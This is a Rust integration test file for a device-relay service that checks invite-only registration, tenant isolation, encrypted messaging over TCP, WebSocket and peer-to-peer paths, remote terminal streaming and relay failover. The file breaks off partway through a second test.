use std::{net::SocketAddr, sync::OnceLock};

use base64::{engine::general_purpose::STANDARD as B64, Engine as _};
use coda_daemon::{
    discover_local_endpoints_with_port, list_account_hosts, mint_peer_relay_config,
    poll_device_login_once, run_daemon_once_with_p2p, spawn_direct_p2p_listener,
    spawn_lan_udp_beacon, start_device_login_flow, DirectP2pClient, PeerIdentityPin,
    SmartPeerClient, SmartRelayFallbackConfig,
};
use coda_herdr::{discover_hc_binary, HerdrClient};
use coda_protocol::{
    current_unix_ms, p2p_ack_v2_signing_bytes, p2p_hello_v2_signing_bytes, E2eeSession,
    NetworkEndpointCandidate, PeerMessage, RelaySessionAuth, RelayWireFrame,
    StoredDeviceIdentity, TrafficLane, VoiceModelConfig,
};
use coda_server::{
    db::{DeviceAuthPublicInfo, DeviceRecord, InviteCodeRecord},
    start_full_server, start_full_server_with_options, AuthResponse, MintRelayTicketResponse,
    PairTokenResponse, ServerOptions,
};
use futures_util::{SinkExt, StreamExt};
use serde_json::json;
use tokio::{
    io::{AsyncReadExt, AsyncWriteExt},
    net::TcpStream,
    sync::Mutex,
};
use tokio_tungstenite::{connect_async, tungstenite::Message as WsMsg};

static DB_TEST_LOCK: OnceLock<Mutex<()>> = OnceLock::new();
const TEST_DB_ADVISORY_LOCK_KEY: i64 = 9_876_543;

async fn acquire_clean_test_db(db_url: &str) -> tokio_postgres::Client {
    let (pg, conn) = tokio_postgres::connect(db_url, tokio_postgres::NoTls)
        .await
        .expect("PostgreSQL coda_test should be running");
    tokio::spawn(async move {
        let _ = conn.await;
    });
    pg.query_one("SELECT pg_advisory_lock($1)", &[&TEST_DB_ADVISORY_LOCK_KEY])
        .await
        .expect("acquire cross-binary pg_advisory_lock");
    let _ = coda_server::db::Db::connect_and_migrate(db_url)
        .await
        .expect("PostgreSQL coda_test should be reachable and migrate cleanly");
    pg.batch_execute(
        "TRUNCATE server_kv, password_reset_tokens, web_push_subscriptions, user_prompt_snippets, device_auth_requests, pairing_tokens, devices, auth_sessions, invite_codes, users RESTART IDENTITY CASCADE;",
    )
    .await
    .unwrap();
    pg
}

#[tokio::test]
async fn test_multi_tenant_postgres_and_raw_tcp_e2ee_herdr_tunnel() {
    let _guard = DB_TEST_LOCK.get_or_init(|| Mutex::new(())).lock().await;
    let db_url = std::env::var("TEST_DATABASE_URL")
        .unwrap_or_else(|_| "postgres://vampire@localhost:5432/coda_test".to_string());
    let _pg_lock = acquire_clean_test_db(&db_url).await;

    let server = start_full_server(
        &db_url,
        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
        b"integration-test-hmac-secret-2026".to_vec(),
        None,
        None,
    )
    .await
    .unwrap();

    let base = format!("http://{}", server.http_addr);
    let http = reqwest::Client::new();

    // 1. First user registers WITHOUT invite code -> automatically promoted to Admin
    let owner_auth: AuthResponse = http
        .post(format!("{base}/api/v1/auth/register"))
        .json(&json!({
            "email": "owner@coda.dev",
            "handle": "vampire",
            "display_name": "Vampire",
            "password": "correct-horse-battery",
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(owner_auth.user.is_admin);

    // 2. Stranger without invite code MUST be rejected
    let uninvited_resp = http
        .post(format!("{base}/api/v1/auth/register"))
        .json(&json!({
            "email": "stranger@example.com",
            "handle": "stranger",
            "display_name": "Stranger",
            "password": "password123",
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(uninvited_resp.status(), reqwest::StatusCode::BAD_REQUEST);

    // 3. Owner creates a friend invite code, and Friend Leo registers cleanly
    let invite: InviteCodeRecord = http
        .post(format!("{base}/api/v1/invites"))
        .bearer_auth(&owner_auth.token)
        .json(&json!({ "note": "For Leo", "max_uses": 2, "valid_days": 7 }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();

    let friend_auth: AuthResponse = http
        .post(format!("{base}/api/v1/auth/register"))
        .json(&json!({
            "email": "leo@friends.dev",
            "handle": "leo",
            "display_name": "Leo",
            "password": "friend-password-123",
            "invite_code": invite.code,
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(!friend_auth.user.is_admin);

    // 4. Owner creates 6-digit pairing code and pairs local Mac Daemon
    let pair_tok: PairTokenResponse = http
        .post(format!("{base}/api/v1/devices/pair-token"))
        .bearer_auth(&owner_auth.token)
        .json(&json!({ "suggested_name": "Mac-Mini-Studio" }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();

    let daemon_cfg =
        coda_daemon::pair_daemon_with_code(&base, &pair_tok.code, Some("Mac-Mini-Studio".into()))
            .await
            .unwrap();
    assert_eq!(daemon_cfg.owner_handle, "vampire");

    // Spawn daemon in background over Domestic No-ICP Raw TCP mode (`raw_tcp_no_sni`)!
    let cfg_bg = daemon_cfg.clone();
    let daemon_task = tokio::spawn(async move {
        let _ = coda_daemon::run_daemon_once(&cfg_bg, Some("raw_tcp_no_sni")).await;
    });
    let ready_deadline = tokio::time::Instant::now() + std::time::Duration::from_secs(5);
    let mut daemon_online = false;
    while tokio::time::Instant::now() < ready_deadline {
        if let Ok(resp) = http
            .get(format!("{base}/api/v1/devices"))
            .bearer_auth(&owner_auth.token)
            .send()
            .await
        {
            if let Ok(devs) = resp.json::<Vec<DeviceRecord>>().await {
                if devs.iter().any(|d| d.id == daemon_cfg.device_id && d.is_online) {
                    daemon_online = true;
                    break;
                }
            }
        }
        tokio::time::sleep(std::time::Duration::from_millis(40)).await;
    }
    assert!(daemon_online, "daemon should register online on Raw TCP relay within 5s");

    // 5. Verify tenant isolation: Friend Leo sees 0 of Vampire's devices & cannot mint relay ticket to it!
    let leo_devices: Vec<DeviceRecord> = http
        .get(format!("{base}/api/v1/devices"))
        .bearer_auth(&friend_auth.token)
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();
    assert!(leo_devices.is_empty(), "friend must NOT see owner's devices");

    let leo_client_id = StoredDeviceIdentity::generate("Leo iPad");
    let leo_dev: DeviceRecord = http
        .post(format!("{base}/api/v1/devices/register-client"))
        .bearer_auth(&friend_auth.token)
        .json(&json!({
            "name": "Leo iPad",
            "platform": "ipados",
            "ed25519_pubkey": leo_client_id.ed25519_public_b64,
            "x25519_pubkey": leo_client_id.x25519_public_b64,
        }))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();

    let cross_tenant_ticket = http
        .post(format!("{base}/api/v1/relay/ticket"))
        .bearer_auth(&friend_auth.token)
        .json(&json!({
            "device_id": leo_dev.id,
            "peer_device_id": daemon_cfg.device_id,
        }))
        .send()
        .await
        .unwrap();
    assert_eq!(
        cross_tenant_ticket.status(),
        reqwest::StatusCode::FORBIDDEN,
        "cross-tenant relay ticket request must be blocked"
    );

    // 6. Owner registers iPhone Duo client and connects over Raw TCP No-SNI with E2EE!
    let mut iphone_duo_id = StoredDeviceIdentity::generate("Vampire iPhone Duo");
    let iphone_dev: DeviceRecord = http
        .post(format!("{base}/api/v1/devices/register-client"))
        .bearer_auth(&owner_auth.token)
        .json(&json!({
            "name": "Vampire iPhone Duo",
            "platform": "iphone_duo",
            "ed25519_pubkey": iphone_duo_id.ed25519_public_b64,
            "x25519_pubkey": iphone_duo_id.x25519_public_b64,
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    iphone_duo_id.device_id = Some(iphone_dev.id);

    let ticket_resp: MintRelayTicketResponse = http
        .post(format!("{base}/api/v1/relay/ticket"))
        .bearer_auth(&owner_auth.token)
        .json(&json!({
            "device_id": iphone_dev.id,
            "peer_device_id": daemon_cfg.device_id,
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();

    let mut raw_stream = TcpStream::connect(server.raw_tcp_addr).await.unwrap();
    let bind = RelayWireFrame::AuthBind {
        ticket: ticket_resp.ticket,
        lane: TrafficLane::ControlP0,
        generation: 1,
    };
    raw_stream
        .write_all(&bind.encode_length_delimited().unwrap())
        .await
        .unwrap();

    let ack = read_len_frame(&mut raw_stream).await;
    assert!(matches!(ack, RelayWireFrame::AuthAck { ok: true, .. }));

    // Derive Zero-Knowledge Relay v2 E2EE session on iPhone Duo
    let relay_auth = RelaySessionAuth::create(
        &iphone_duo_id,
        daemon_cfg.device_id,
        true,
        current_unix_ms(),
    )
    .unwrap();
    let mut e2ee = E2eeSession::derive_relay_session(
        &iphone_duo_id.x25519_secret().unwrap(),
        &daemon_cfg.identity.x25519_public_b64,
        &relay_auth.session_nonce_b64,
        iphone_dev.id,
        daemon_cfg.device_id,
        true,
        true,
    )
    .unwrap();

    // Send E2EE Ping -> Receive E2EE Pong with real `herdr_version`!
    let sealed_ping = e2ee
        .seal_message(&PeerMessage::Ping {
            req_id: "ping-1".into(),
            sent_ms: 12345,
        })
        .unwrap();
    let pkt = RelayWireFrame::RoutePacket {
        src_device_id: iphone_dev.id,
        dst_device_id: daemon_cfg.device_id,
        lane: TrafficLane::ControlP0,
        e2ee: sealed_ping,
        sender_x25519_pub_b64: None,
        session_auth: Some(relay_auth.clone()),
    };
    raw_stream
        .write_all(&pkt.encode_length_delimited().unwrap())
        .await
        .unwrap();

    let reply_frame = next_route_packet(&mut raw_stream).await;
    if let RelayWireFrame::RoutePacket { e2ee: enc_pong, .. } = reply_frame {
        match e2ee.open_message(&enc_pong).unwrap() {
            PeerMessage::Pong {
                req_id,
                daemon_hostname,
                herdr_version,
                ..
            } => {
                assert_eq!(req_id, "ping-1");
                assert_eq!(daemon_hostname, "Mac-Mini-Studio");
                if discover_hc_binary().is_some() {
                    assert!(!herdr_version.is_empty() && herdr_version != "unavailable");
                }
            }
            other => panic!("expected Pong, got {other:?}"),
        }
    } else {
        panic!("expected RoutePacket");
    }

    // Also test launching & reading a real `herdr` terminal over the E2EE Raw TCP tunnel!
    if let Some(hc_bin) = discover_hc_binary() {
        let sealed_launch = e2ee
            .seal_message(&PeerMessage::LaunchAgent {
                req_id: "launch-1".into(),
                agent: "shell".into(),
                name: Some(format!("coda-e2e-{}", std::process::id())),
                cwd: None,
                initial_prompt: None,
                cols: 105,
                rows: 32,
            })
            .unwrap();
        raw_stream
            .write_all(
                &RelayWireFrame::RoutePacket {
                    src_device_id: iphone_dev.id,
                    dst_device_id: daemon_cfg.device_id,
                    lane: TrafficLane::ControlP0,
                    e2ee: sealed_launch,
                    sender_x25519_pub_b64: None,
                    session_auth: Some(relay_auth.clone()),
                }
                .encode_length_delimited()
                .unwrap(),
            )
            .await
            .unwrap();

        let mut term_addr = None;
        for _ in 0..16 {
            let launch_pkt = next_route_packet(&mut raw_stream).await;
            let RelayWireFrame::RoutePacket { e2ee: enc_res, .. } = launch_pkt else {
                panic!("expected launch RoutePacket, got {launch_pkt:?}");
            };
            match e2ee.open_message(&enc_res).unwrap() {
                PeerMessage::LaunchAgentResult {
                    ok: true,
                    terminal: Some(t),
                    ..
                } => {
                    term_addr = Some(t.address);
                    break;
                }
                PeerMessage::HerdrLiveEvent { .. } | PeerMessage::PtyOutputChunk { .. } => {
                    continue;
                }
                other => panic!("unexpected launch result: {other:?}"),
            }
        }
        let term_addr = term_addr.expect("LaunchAgentResult within 16 packets");

        // Clean up test terminal in herdr
        let hc = HerdrClient::connect_with_bin(hc_bin).await.unwrap();
        hc.kill_and_remove(&term_addr).await.unwrap();
    }

    // 7. Verify Overseas CDN WebSocket (`/v1/tunnel/ws`) + 75s Make-Before-Break Generation Rotation!
    let ws_url = format!("ws://{}/v1/tunnel/ws", server.http_addr);
    let wss_ticket: MintRelayTicketResponse = http
        .post(format!("{base}/api/v1/relay/ticket"))
        .bearer_auth(&owner_auth.token)
        .json(&json!({
            "device_id": iphone_dev.id,
            "peer_device_id": daemon_cfg.device_id,
        }))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();

    let (mut ws_gen1, _) = connect_async(&ws_url).await.unwrap();
    ws_gen1
        .send(WsMsg::Text(
            serde_json::to_string(&RelayWireFrame::AuthBind {
                ticket: wss_ticket.ticket.clone(),
                lane: TrafficLane::ControlP0,
                generation: 10,
            })
            .unwrap()
            .into(),
        ))
        .await
        .unwrap();
    let _ = ws_gen1.next().await.unwrap().unwrap(); // AuthAck

    // Pre-warm generation=11 BEFORE closing generation=10 (Make-Before-Break!)
    let (mut ws_gen2, _) = connect_async(&ws_url).await.unwrap();
    ws_gen2
        .send(WsMsg::Text(
            serde_json::to_string(&RelayWireFrame::AuthBind {
                ticket: wss_ticket.ticket,
                lane: TrafficLane::ControlP0,
                generation: 11,
            })
            .unwrap()
            .into(),
        ))
        .await
        .unwrap();
    let _ = ws_gen2.next().await.unwrap().unwrap(); // AuthAck
    let _ = ws_gen1.close(None).await;
    tokio::time::sleep(std::time::Duration::from_millis(80)).await;

    // Send Ping on generation=11 and verify reply arrives seamlessly without session drop!
    let sealed_ping2 = e2ee
        .seal_message(&PeerMessage::Ping {
            req_id: "cdn-handoff-ping".into(),
            sent_ms: 99999,
        })
        .unwrap();
    ws_gen2
        .send(WsMsg::Text(
            serde_json::to_string(&RelayWireFrame::RoutePacket {
                src_device_id: iphone_dev.id,
                dst_device_id: daemon_cfg.device_id,
                lane: TrafficLane::ControlP0,
                e2ee: sealed_ping2,
                sender_x25519_pub_b64: None,
                session_auth: Some(relay_auth.clone()),
            })
            .unwrap()
            .into(),
        ))
        .await
        .unwrap();

    let mut got_pong2 = false;
    while let Some(Ok(WsMsg::Text(txt))) = ws_gen2.next().await {
        let f: RelayWireFrame = serde_json::from_str(&txt).unwrap();
        if let RelayWireFrame::RoutePacket { e2ee: enc_p, .. } = f {
            if let PeerMessage::Pong { req_id, .. } = e2ee.open_message(&enc_p).unwrap() {
                assert_eq!(req_id, "cdn-handoff-ping");
                got_pong2 = true;
                break;
            }
        }
    }
    assert!(got_pong2, "CDN WSS Make-Before-Break generation=11 should receive Pong");

    // 8. Verify One-Click `/install.sh` endpoint
    let script_txt = http
        .get(format!("{base}/install.sh"))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .text()
        .await
        .unwrap();
    assert!(script_txt.contains("coda-daemon pair"));

    // 9. Verify Phase 3 Direct P2P Zero-Relay Engine + Phase 2 Full-Duplex PTY, Workspaces, File Upload & Voice Config
    let p2p_addr = spawn_direct_p2p_listener(
        daemon_cfg.clone(),
        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
    )
    .await
    .unwrap();

    let daemon_pin = PeerIdentityPin {
        ed25519_pub_b64: daemon_cfg.identity.ed25519_public_b64.clone(),
        x25519_pub_b64: daemon_cfg.identity.x25519_public_b64.clone(),
    };
    let mut p2p_client = DirectP2pClient::connect_direct(
        &p2p_addr.to_string(),
        &iphone_duo_id,
        iphone_dev.id,
        daemon_cfg.device_id,
        &daemon_pin,
    )
    .await
    .unwrap();
    assert_eq!(p2p_client.path_kind, "lan_ipv4");

    // Set Voice Model Config (`provider + baseurl + key`) over Direct P2P
    p2p_client
        .send_message(
            &PeerMessage::SetVoiceConfig {
                req_id: "voice-1".into(),
                config: VoiceModelConfig {
                    provider: "openai".into(),
                    base_url: "https://api.openai.com/v1".into(),
                    api_key: "sk-e2e-p2p".into(),
                    model: "gpt-4o-mini-transcribe".into(),
                },
            },
            TrafficLane::ControlP0,
        )
        .await
        .unwrap();
    match p2p_client.recv_message().await.unwrap() {
        PeerMessage::VoiceConfigAck { req_id, config, .. } => {
            assert_eq!(req_id, "voice-1");
            assert_eq!(config.provider, "openai");
        }
        other => panic!("expected VoiceConfigAck, got {other:?}"),
    }

    // List Workspaces (Git repos + worktrees + diff stats + voice config) over Direct P2P
    p2p_client
        .send_message(
            &PeerMessage::ListWorkspaces {
                req_id: "ws-1".into(),
                root_dirs: vec![],
            },
            TrafficLane::ControlP0,
        )
        .await
        .unwrap();
    match p2p_client.recv_message().await.unwrap() {
        PeerMessage::WorkspacesSnapshot {
            req_id,
            machine_name,
            repos,
            ..
        } => {
            assert_eq!(req_id, "ws-1");
            assert_eq!(machine_name, "Mac-Mini-Studio");
            assert!(!repos.is_empty());
        }
        other => panic!("expected WorkspacesSnapshot, got {other:?}"),
    }

    // Full-Duplex PTY Attach + File Upload (`hc terminal.put`) over Direct P2P
    if let Some(hc_bin) = discover_hc_binary() {
        p2p_client
            .send_message(
                &PeerMessage::LaunchAgent {
                    req_id: "p2p-launch".into(),
                    agent: "shell".into(),
                    name: Some(format!("coda-p2p-{}", std::process::id())),
                    cwd: None,
                    initial_prompt: None,
                    cols: 100,
                    rows: 30,
                },
                TrafficLane::ControlP0,
            )
            .await
            .unwrap();
        let term_addr = match p2p_client.recv_message().await.unwrap() {
            PeerMessage::LaunchAgentResult {
                ok: true,
                terminal: Some(t),
                ..
            } => t.address,
            other => panic!("expected LaunchAgentResult, got {other:?}"),
        };

        // Upload file via `[ 📎 ]` (`UploadTerminalFile` -> `hc terminal.put`)
        p2p_client
            .send_message(
                &PeerMessage::UploadTerminalFile {
                    req_id: "up-1".into(),
                    terminal: term_addr.clone(),
                    filename: "screenshot.png".into(),
                    data_b64: B64.encode(b"FAKE_PNG_BYTES_12345"),
                },
                TrafficLane::ControlP0,
            )
            .await
            .unwrap();
        match p2p_client.recv_message().await.unwrap() {
            PeerMessage::UploadTerminalFileResult {
                ok: true,
                remote_path: Some(path),
                bytes,
                ..
            } => {
                assert!(path.contains("screenshot.png"));
                assert_eq!(bytes, 20);
            }
            other => panic!("expected UploadTerminalFileResult, got {other:?}"),
        }

        // Attach live PTY stream
        p2p_client
            .send_message(
                &PeerMessage::PtyAttach {
                    req_id: "pty-1".into(),
                    terminal: term_addr.clone(),
                    cols: 100,
                    rows: 30,
                },
                TrafficLane::ControlP0,
            )
            .await
            .unwrap();
        p2p_client
            .send_message(
                &PeerMessage::PtyResize {
                    terminal: term_addr.clone(),
                    cols: 120,
                    rows: 36,
                },
                TrafficLane::ControlP0,
            )
            .await
            .unwrap();
        p2p_client
            .send_message(
                &PeerMessage::PtyInput {
                    terminal: term_addr.clone(),
                    data_b64: B64.encode(b"echo P2P_PTY_STREAM_OK\r"),
                },
                TrafficLane::ControlP0,
            )
            .await
            .unwrap();

        let mut pty_attached_ok = false;
        let mut pty_stream_bytes = String::new();
        let deadline = tokio::time::Instant::now() + std::time::Duration::from_secs(3);
        while tokio::time::Instant::now() < deadline {
            if let Ok(Ok(msg)) =
                tokio::time::timeout(std::time::Duration::from_millis(300), p2p_client.recv_message())
                    .await
            {
                match msg {
                    PeerMessage::PtyAttached { ok: true, .. } => {
                        pty_attached_ok = true;
                    }
                    PeerMessage::PtyOutputChunk { data_b64, .. } => {
                        let raw = B64.decode(&data_b64).unwrap_or_default();
                        pty_stream_bytes.push_str(&String::from_utf8_lossy(&raw));
                        if pty_attached_ok && pty_stream_bytes.contains("P2P_PTY_STREAM_OK") {
                            break;
                        }
                    }
                    _ => {}
                }
            }
        }
        assert!(pty_attached_ok, "expected PtyAttached ok=true");
        assert!(
            pty_stream_bytes.contains("P2P_PTY_STREAM_OK"),
            "expected live PTY stream over Direct P2P to contain marker"
        );

        p2p_client
            .send_message(
                &PeerMessage::PtyDetach {
                    req_id: "det-1".into(),
                    terminal: term_addr.clone(),
                },
                TrafficLane::ControlP0,
            )
            .await
            .unwrap();

        let hc = HerdrClient::connect_with_bin(hc_bin).await.unwrap();
        hc.kill_and_remove(&term_addr).await.unwrap();
    }

    // 10. Verify Auto-LAN Protocol Auto-Detection (Browser WebSocket on SAME p2p_addr!),
    //     Dynamic Endpoint Advertising, UDP LAN Beacon Discovery & SmartPeerClient Failover!
    let custom_eps = discover_local_endpoints_with_port(p2p_addr.port());
    if !custom_eps.is_empty() {
        assert!(custom_eps.iter().any(|e| e.kind == "lan_ws" || e.kind == "ipv6_ws"));
    }

    // 10a. Browser WebSocket connecting DIRECTLY to `ws://<p2p_addr>` (same port as Raw TCP `DirectP2pClient`!)
    let web_id = StoredDeviceIdentity::generate("Browser Web Console");
    let web_dev: DeviceRecord = http
        .post(format!("{base}/api/v1/devices/register-client"))
        .bearer_auth(&owner_auth.token)
        .json(&json!({
            "name": "Browser Web Console",
            "platform": "web",
            "ed25519_pubkey": web_id.ed25519_public_b64,
            "x25519_pubkey": web_id.x25519_public_b64,
        }))
        .send()
        .await
        .unwrap()
        .error_for_status()
        .unwrap()
        .json()
        .await
        .unwrap();
    let web_client_id = web_dev.id;

    let lan_ws_url = format!("ws://{p2p_addr}");
    let (mut lan_ws, _) = connect_async(&lan_ws_url).await.unwrap();
    let ts_ms = current_unix_ms();
    let (web_eph_secret, web_eph_pub_b64) = StoredDeviceIdentity::generate_ephemeral_x25519();
    let hello_signing = p2p_hello_v2_signing_bytes(
        web_client_id,
        daemon_cfg.device_id,
        &web_id.x25519_public_b64,
        &web_eph_pub_b64,
        ts_ms,
    );
    let sig_b64 = web_id.sign(&hello_signing).unwrap();

    lan_ws
        .send(WsMsg::Text(
            serde_json::to_string(&RelayWireFrame::DirectP2pHello {
                client_device_id: web_client_id,
                target_device_id: daemon_cfg.device_id,
                client_ed25519_pub_b64: web_id.ed25519_public_b64.clone(),
                client_x25519_pub_b64: web_id.x25519_public_b64.clone(),
                client_ephemeral_x25519_pub_b64: web_eph_pub_b64.clone(),
                timestamp_ms: ts_ms,
                signature_b64: sig_b64,
                supports_zstd: true,
            })
            .unwrap()
            .into(),
        ))
        .await
        .unwrap();

    let ack_txt = match lan_ws.next().await.unwrap().unwrap() {
        WsMsg::Text(t) => t,
        other => panic!("expected DirectP2pAck text frame, got {other:?}"),
    };
    let ack_frame: RelayWireFrame = serde_json::from_str(&ack_txt).unwrap();
    let daemon_eph_pub = match ack_frame {
        RelayWireFrame::DirectP2pAck {
            ok: true,
            daemon_device_id,
            daemon_ed25519_pub_b64,
            daemon_x25519_pub_b64,
            daemon_ephemeral_x25519_pub_b64,
            timestamp_ms: ack_ts,
            signature_b64: ack_sig,
            path_kind,
            ..
        } => {
            assert_eq!(daemon_device_id, daemon_cfg.device_id);
            assert_eq!(
                daemon_ed25519_pub_b64,
                daemon_cfg.identity.ed25519_public_b64
            );
            assert_eq!(daemon_x25519_pub_b64, daemon_cfg.identity.x25519_public_b64);
            assert_eq!(path_kind, "lan_ws");
            let ack_signed = p2p_ack_v2_signing_bytes(
                web_client_id,
                daemon_device_id,
                &web_eph_pub_b64,
                &daemon_ephemeral_x25519_pub_b64,
                ack_ts,
            );
            StoredDeviceIdentity::verify_signature(
                &daemon_cfg.identity.ed25519_public_b64,
                &ack_signed,
                &ack_sig,
            )
            .unwrap();
            daemon_ephemeral_x25519_pub_b64
        }
        other => panic!("unexpected direct WS ack: {other:?}"),
    };

    let mut lan_ws_e2ee = E2eeSession::derive_ephemeral_p2p(
        &web_id.x25519_secret().unwrap(),
        &daemon_cfg.identity.x25519_public_b64,
        &web_eph_secret,
        &daemon_eph_pub,
        web_client_id,
        daemon_cfg.device_id,
        true,
        true,
    )
    .unwrap();
    let sealed_ws_ping = lan_ws_e2ee
        .seal_message(&PeerMessage::Ping {
            req_id: "lan-ws-ping-1".into(),
            sent_ms: 555,
        })
        .unwrap();
    lan_ws
        .send(WsMsg::Text(
            serde_json::to_string(&RelayWireFrame::RoutePacket {
                src_device_id: web_client_id,
                dst_device_id: daemon_cfg.device_id,
                lane: TrafficLane::ControlP0,
                e2ee: sealed_ws_ping,
                sender_x25519_pub_b64: None,
                session_auth: None,
            })
            .unwrap()
            .into(),
        ))
        .await
        .unwrap();

    let pong_txt = match lan_ws.next().await.unwrap().unwrap() {
        WsMsg::Text(t) => t,
        other => panic!("expected Pong RoutePacket text frame, got {other:?}"),
    };
    if let RelayWireFrame::RoutePacket { e2ee: enc_p, .. } =
        serde_json::from_str::<RelayWireFrame>(&pong_txt).unwrap()
    {
        match lan_ws_e2ee.open_message(&enc_p).unwrap() {
            PeerMessage::Pong { req_id, .. } => assert_eq!(req_id, "lan-ws-ping-1"),
            other => panic!("expected Pong, got {other:?}"),
        }
    } else {
        panic!("expected RoutePacket over Direct LAN WebSocket");
    }
    let _ = lan_ws.close(None).await;

    // 10b. Verify Dynamic `AdvertiseEndpoints` -> `PeerPresence` broadcast + PostgreSQL update!
    let relay_hub_eps = vec![
        NetworkEndpointCandidate {
            kind: "lan_ipv4".into(),
            addr: p2p_addr.to_string(),
        },
        NetworkEndpointCandidate {
            kind: "lan_ws".into(),
            addr: lan_ws_url.clone(),
        },
    ];
    let (mut daemon_ad_ws, _) = connect_async(&ws_url).await.unwrap();
    daemon_ad_ws
        .send(WsMsg::Text(
            serde_json::to_string(&RelayWireFrame::AuthBind {
                ticket: daemon_cfg.daemon_relay_ticket.clone(),
                lane: TrafficLane::BulkP1,
                generation: 99,
            })
            .unwrap()
            .into(),
        ))
        .await
        .unwrap();
    let _ = daemon_ad_ws.next().await.unwrap().unwrap(); // AuthAck
    daemon_ad_ws
        .send(WsMsg::Text(
            serde_json::to_string(&RelayWireFrame::AdvertiseEndpoints {
                endpoints: relay_hub_eps.clone(),
            })
            .unwrap()
            .into(),
        ))
        .await
        .unwrap();

    let mut saw_presence_endpoints = false;
    let pres_deadline = tokio::time::Instant::now() + std::time::Duration::from_secs(2);
    while tokio::time::Instant::now() < pres_deadline {
        if let Ok(Some(Ok(WsMsg::Text(txt)))) =
            tokio::time::timeout(std::time::Duration::from_millis(300), ws_gen2.next()).await
        {
            if let Ok(RelayWireFrame::PeerPresence {
                device_id,
                is_online: true,
                endpoints: Some(eps),
            }) = serde_json::from_str::<RelayWireFrame>(&txt)
            {
                if device_id == daemon_cfg.device_id
                    && eps.iter().any(|e| e.kind == "lan_ws" && e.addr == lan_ws_url)
                {
                    saw_presence_endpoints = true;
                    break;
                }
            }
        }
    }
    assert!(
        saw_presence_endpoints,
        "client should receive live PeerPresence with updated LAN endpoints"
    );
    let _ = daemon_ad_ws.close(None).await;

    // 10c. Verify UDP LAN Beacon Discovery + `SmartPeerClient` Automatic Negotiation & Seamless Wi-Fi Drop Failover!
    // Spawn a controllable TCP proxy in front of `p2p_addr` so we can simulate Wi-Fi loss mid-session.
    let proxy_listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let proxy_addr = proxy_listener.local_addr().unwrap();
    let proxy_task = tokio::spawn(async move {
        if let Ok((mut client_s, _)) = proxy_listener.accept().await {
            if let Ok(mut server_s) = TcpStream::connect(p2p_addr).await {
                let _ = tokio::io::copy_bidirectional(&mut client_s, &mut server_s).await;
            }
        }
    });

    let udp_beacon_addr = spawn_lan_udp_beacon(
        daemon_cfg.device_id,
        proxy_addr.port(),
        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
    )
    .await
    .unwrap();

    let failover_ticket: MintRelayTicketResponse = http
        .post(format!("{base}/api/v1/relay/ticket"))
        .bearer_auth(&owner_auth.token)
        .json(&json!({
            "device_id": iphone_dev.id,
            "peer_device_id": daemon_cfg.device_id,
        }))
        .send()
        .await
        .unwrap()
        .json()
        .await
        .unwrap();

    // Pass EMPTY static endpoints so discovery relies 100% on the UDP LAN Beacon!
    let mut smart = SmartPeerClient::connect_auto(
        iphone_duo_id.clone(),
        iphone_dev.id,
        daemon_cfg.device_id,
        daemon_pin.clone(),
        vec![],
        Some(udp_beacon_addr),
        Some(SmartRelayFallbackConfig {
            raw_tcp_addr: Some(server.raw_tcp_addr.to_string()),
            wss_url: None,
            relay_ticket: failover_ticket.ticket,
            peer_ed25519_pub_b64: daemon_cfg.identity.ed25519_public_b64.clone(),
            peer_x25519_pub_b64: daemon_cfg.identity.x25519_public_b64.clone(),
        }),
    )
    .await
    .unwrap();

    assert!(smart.is_direct_p2p(), "SmartPeerClient should auto-negotiate Direct P2P via UDP beacon");
    assert_eq!(smart.active_route(), "lan_ipv4");

    match smart
        .request(
            &PeerMessage::Ping {
                req_id: "smart-lan-1".into(),
                sent_ms: 111,
            },
            TrafficLane::ControlP0,
        )
        .await
        .unwrap()
    {
        PeerMessage::Pong { req_id, .. } => assert_eq!(req_id, "smart-lan-1"),
        other => panic!("expected Pong over LAN Direct, got {other:?}"),
    }

    // Simulate iPhone leaving Wi-Fi -> kill the direct LAN TCP proxy socket!
    proxy_task.abort();
    tokio::time::sleep(std::time::Duration::from_millis(50)).await;

    // Next request MUST seamlessly fail over to Relay (`relay_raw_tcp`) with zero error!
    match smart
        .request(
            &PeerMessage::Ping {
                req_id: "smart-failover-2".into(),
                sent_ms: 222,
            },
            TrafficLane::ControlP0,
        )
        .await
        .unwrap()
    {
        PeerMessage::Pong { req_id, .. } => assert_eq!(req_id, "smart-failover-2"),
        other => panic!("expected Pong after relay failover, got {other:?}"),
    }
    assert!(!smart.is_direct_p2p());
    assert_eq!(smart.active_route(), "relay_raw_tcp");

    daemon_task.abort();
}

#[tokio::test]
async fn test_open_portal_device_code_rfc8628_and_cloudflare_wss_mesh() {
    let _guard = DB_TEST_LOCK.get_or_init(|| Mutex::new(())).lock().await;
    let db_url = std::env::var("TEST_DATABASE_URL")
        .unwrap_or_else(|_| "postgres://vampire@localhost:5432/coda_test".to_string());
    let _pg_lock = acquire_clean_test_db(&db_url).await;

    let temp_web_dist = std::env::temp_dir().join(format!("coda-e2e-web-{}", uuid::Uuid::new_v4()));
    std::fs::create_dir_all(&temp_web_dist).unwrap();
    std::fs::write(
        temp_web_dist.join("index.html"),
        "<!doctype html><div id=\"app\"></div>",
    )
    .unwrap();
    std::fs::write(temp_web_dist.join("app.abcdef1234.js"), "console.log(\"ok\");").unwrap();

    let server = start_full_server_with_options(
        &db_url,
        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
        "127.0.0.1:0".parse::<SocketAddr>().unwrap(),
